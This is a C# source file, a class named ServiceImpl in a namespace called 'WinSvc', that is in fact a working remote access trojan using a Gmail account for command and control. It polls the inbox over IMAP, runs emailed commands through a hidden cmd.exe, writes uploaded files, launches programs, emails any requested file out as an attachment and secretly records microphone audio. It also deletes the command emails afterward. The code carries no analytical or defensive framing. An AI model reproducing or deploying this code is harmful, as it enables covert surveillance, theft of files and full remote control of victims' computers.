using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Configuration;

namespace WinSvc;

public class ServiceImpl
{
    private readonly string _gmailUser = ConfigurationManager.AppSettings["Gmail:Username"]
        ?? throw new InvalidOperationException("Gmail:Username not configured");
    private readonly string _gmailAppPassword = ConfigurationManager.AppSettings["Gmail:Password"]
        ?? throw new InvalidOperationException("Gmail:Password not configured");

    [DllImport("winmm.dll")]
    private static extern int mciSendString(string command, StringBuilder returnValue, int returnLength, IntPtr winHandle);

    public byte[] RecordAudio(int durationSeconds = 10)
    {
        string tempFile = Path.Combine(Path.GetTempPath(), "recording.wav");

        mciSendString("open new Type waveaudio Alias recsound", null, 0, IntPtr.Zero);
        mciSendString("record recsound", null, 0, IntPtr.Zero);
        System.Threading.Thread.Sleep(durationSeconds * 1000);
        mciSendString($"save recsound {tempFile}", null, 0, IntPtr.Zero);
        mciSendString("close recsound", null, 0, IntPtr.Zero);

        byte[] data = File.ReadAllBytes(tempFile);
        File.Delete(tempFile);
        return data;
    }

    public void SendEmail(string subject, string body, byte[] attachment = null, string attachmentName = null)
    {
        SmtpClient client = null;
        MailMessage message = null;

        try
        {
            client = new SmtpClient("smtp.gmail.com", 587)
            {
                EnableSsl = true,
                Credentials = new NetworkCredential(_gmailUser, _gmailAppPassword)
            };

            message = new MailMessage
            {
                From = new MailAddress(_gmailUser),
                Subject = subject,
                Body = body
            };
            message.To.Add(_gmailUser);

            if (attachment != null && attachmentName != null)
            {
                message.Attachments.Add(new Attachment(new MemoryStream(attachment), attachmentName));
            }

            client.Send(message);
        }
        finally
        {
            if (message != null) message.Dispose();
            if (client != null) client.Dispose();
        }
    }

    public void ProcessCommands()
    {
        TcpClient client = null;
        System.Net.Security.SslStream ssl = null;

        try
        {
            client = new TcpClient("imap.gmail.com", 993);
            ssl = new System.Net.Security.SslStream(client.GetStream());
            ssl.AuthenticateAsClient("imap.gmail.com");

            StreamReader reader = new StreamReader(ssl);
            StreamWriter writer = new StreamWriter(ssl) { AutoFlush = true };

            reader.ReadLine();

            writer.WriteLine($"A001 LOGIN {_gmailUser} {_gmailAppPassword}");
            reader.ReadLine();

            writer.WriteLine("A002 SELECT INBOX");
            string line;
            while (!(line = reader.ReadLine()).Contains("A002 OK")) { }

            writer.WriteLine("A003 SEARCH UNSEEN");
            string searchResult = reader.ReadLine();
            while (!(line = reader.ReadLine()).Contains("A003 OK")) { }

            if (searchResult.Contains("* SEARCH"))
            {
                string[] uids = searchResult.Replace("* SEARCH", "").Trim().Split(' ');

                foreach (string uid in uids)
                {
                    if (string.IsNullOrWhiteSpace(uid)) continue;

                    writer.WriteLine($"A004 FETCH {uid} BODY[TEXT]");
                    StringBuilder body = new StringBuilder();
                    while (!(line = reader.ReadLine()).Contains("A004 OK"))
                    {
                        if (!line.StartsWith("*") && !line.StartsWith("A004"))
                            body.AppendLine(line);
                    }

                    string command = body.ToString().Trim();
                    string result = ExecuteCommand(command);

                    writer.WriteLine($"A005 STORE {uid} +FLAGS (\\Seen)");
                    while (!(line = reader.ReadLine()).Contains("A005 OK")) { }

                    writer.WriteLine($"A006 COPY {uid} \"[Gmail]/Processed\"");
                    while (!(line = reader.ReadLine()).Contains("A006 OK")) { }

                    writer.WriteLine($"A007 STORE {uid} +FLAGS (\\Deleted)");
                    while (!(line = reader.ReadLine()).Contains("A007 OK")) { }

                    SendEmail($"Result: {command}", result);
                }
            }

            writer.WriteLine("A008 LOGOUT");
        }
        finally
        {
            if (ssl != null) ssl.Dispose();
            if (client != null) client.Dispose();
        }
    }

    private string ExecuteCommand(string command)
    {
        try
        {
            if (command.StartsWith("CMD:", StringComparison.OrdinalIgnoreCase))
            {
                return ExecuteCmdCommand(command.Substring(4).Trim());
            }
            else if (command.StartsWith("UPLOAD:", StringComparison.OrdinalIgnoreCase))
            {
                string[] parts = command.Substring(7).Split('|');
                byte[] data = Convert.FromBase64String(parts[0]);
                File.WriteAllBytes(parts[1], data);
                return $"Uploaded to {parts[1]}";
            }
            else if (command.StartsWith("DOWNLOAD:", StringComparison.OrdinalIgnoreCase))
            {
                string path = command.Substring(9).Trim();
                byte[] data = File.ReadAllBytes(path);
                SendEmail($"File: {Path.GetFileName(path)}", "See attachment", data, Path.GetFileName(path));
                return $"Downloaded {path}";
            }
            else if (command.StartsWith("RUN:", StringComparison.OrdinalIgnoreCase))
            {
                string path = command.Substring(4).Trim();
                Process.Start(path);
                return $"Started {path}";
            }
            else if (command.StartsWith("RECORD:", StringComparison.OrdinalIgnoreCase))
            {
                int seconds = int.Parse(command.Substring(7).Trim());
                byte[] audio = RecordAudio(seconds);
                SendEmail("Audio Recording", $"Recorded {seconds}s", audio, "recording.wav");
                return $"Recorded {seconds}s and sent";
            }

            return "Unknown command";
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private string ExecuteCmdCommand(string cmd)
    {
        Process process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {cmd}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        return string.IsNullOrEmpty(error) ? output : $"{output}\nErrors:\n{error}";
    }
}
